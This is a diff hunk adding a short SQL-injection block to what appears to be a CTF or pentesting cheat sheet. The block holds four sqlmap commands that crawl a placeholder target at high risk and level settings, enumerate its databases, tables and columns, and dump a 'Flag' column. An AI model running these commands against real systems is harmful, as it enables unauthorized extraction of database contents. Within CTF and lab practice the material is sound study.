@@ -231,6 +231,15 @@ https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthroug
 
 ################################################################## Sql injection ##################################################################
 
+### Tek sql
+sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 --dbs
+sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name --tables
+sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
+sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
+###
+
+
+
 SQLMAP Key Options:
 
 Target URL:
